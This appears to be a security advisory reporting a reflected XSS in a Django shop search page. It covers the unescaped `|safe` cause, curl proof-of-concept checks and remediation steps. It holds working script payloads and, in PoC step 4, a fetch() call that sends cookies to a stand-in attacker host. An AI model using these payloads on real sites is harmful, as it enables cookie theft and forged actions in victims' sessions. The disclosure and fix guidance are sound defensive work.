# Description

Reflected Cross-Site Scripting (CWE-79) on the shop search endpoint `GET /shop/?q=<payload>`. The `shop()` view in `Shopping/views.py` passes the raw `q` parameter to the template, which renders it with the `|safe` filter (`Results for: {{ query|safe }}`), disabling Django's auto-escaping. Any HTML/JavaScript supplied in `q` is reflected verbatim into the response and executed by the victim's browser.

The vulnerability is:
- **Reflected** — the payload lives in the URL and runs on page load.
- **Unauthenticated** — no session cookie is required to reach the endpoint.
- **Undefended** — the application sends no `Content-Security-Policy`, `X-Content-Type-Options`, or `X-XSS-Protection`, so the browser has nothing to fall back on.

Because the `csrftoken` cookie is **not** marked `HttpOnly`, a successful injection can steal it and forge state-changing requests in the victim's session.

# Exploitation

| Step | Action | Result |
|------|--------|--------|
| 1 | Craft a URL with a script payload in `q`. | `/shop/?q=<script>alert(document.domain)</script>` |
| 2 | Send the (URL-encoded) link to a victim via forum, DM, or e-mail. | No attacker account needed. |
| 3 | Victim opens the link. | The `<script>` tag is parsed and executed on the application's origin. |

The injected markup is placed directly inside the search-info paragraph:

```html
<p class="search-info">Results for: <script>alert(document.domain)</script></p>
```

# PoC

**1. Confirm reflection without authentication:**

```bash
curl -i "http://<TARGET>/shop/?q=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E" | grep -A1 "search-info"
# <p class="search-info">Results for: <script>alert(document.domain)</script></p>
```

![Alert firing on the shop search page](xss-shop-search-alert.png)

**2. Verify the bytes are RAW `<script>` (not HTML-encoded):**

```bash
curl -s "http://<TARGET>/shop/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E" | grep "search-info" | xxd | head -5
# literal bytes 3c 73 63 72 69 70 74 3e = "<script>"  (encoded "&lt;" would be 26 6c 74 3b)
```

![Raw, unescaped payload in the HTML source](xss-shop-search-source.png)

**3. Confirm no defense headers are present:**

```bash
curl -sI "http://<TARGET>/shop/?q=test" | grep -iE "content-security-policy|x-xss-protection|x-content-type-options"
# (empty)
```

![No security headers on the response](xss-shop-no-defense-headers.png)

**4. Weaponised payload — `csrftoken` exfiltration** (cookie is not `HttpOnly`):

```
/shop/?q=<script>fetch('https://attacker.example/c?t='+document.cookie)</script>
```

![csrftoken cookie readable from JavaScript](xss-shop-cookie-disclosure.png)

# Risk

| Dimension | Impact |
|-----------|--------|
| Confidentiality | Theft of the non-`HttpOnly` `csrftoken` cookie and any DOM-accessible data. |
| Integrity | Forged state-changing actions (purchases, profile/password changes, forum posts) in the victim's session. |
| Availability | A fake login form injected on the trusted domain enables credential phishing. |

Overall severity: **Medium** — unauthenticated, trivially exploitable, no defense-in-depth. Can be chained with the stored XSS in user biographies for self-propagation.

# Remediation

1. **Remove the `|safe` filter** — render the query with Django's default auto-escaping (`{{ query }}`).
2. **Add a Content-Security-Policy** (`default-src 'self'; script-src 'self'`) to block inline script execution as defense-in-depth.
3. **Set `X-Content-Type-Options: nosniff`** on all responses.
4. **Mark the CSRF cookie `HttpOnly`** (`CSRF_COOKIE_HTTPONLY = True`) so XSS cannot read it, and use `SameSite=Strict` on session cookies.

# Author
Hackrapovic
